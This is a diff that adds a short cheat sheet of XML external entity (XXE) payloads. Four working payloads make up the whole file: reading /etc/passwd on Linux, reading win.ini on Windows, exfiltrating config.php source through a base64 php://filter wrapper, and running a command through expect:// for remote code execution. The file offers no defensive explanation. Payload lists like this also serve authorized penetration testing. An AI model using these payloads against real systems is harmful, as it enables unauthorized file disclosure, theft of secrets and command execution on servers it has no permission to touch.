@@ -1,0 +1,21 @@
+# Basic XXE for File Disclosure
+
+# Linux Local File
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<test>&xxe;</test>
+
+# Windows Local File
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
+<test>&xxe;</test>
+
+# PHP Wrappers (Source Code Exfiltration)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> ]>
+<test>&xxe;</test>
+
+# PHP Expect (RCE if module is loaded)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://id"> ]>
+<test>&xxe;</test>
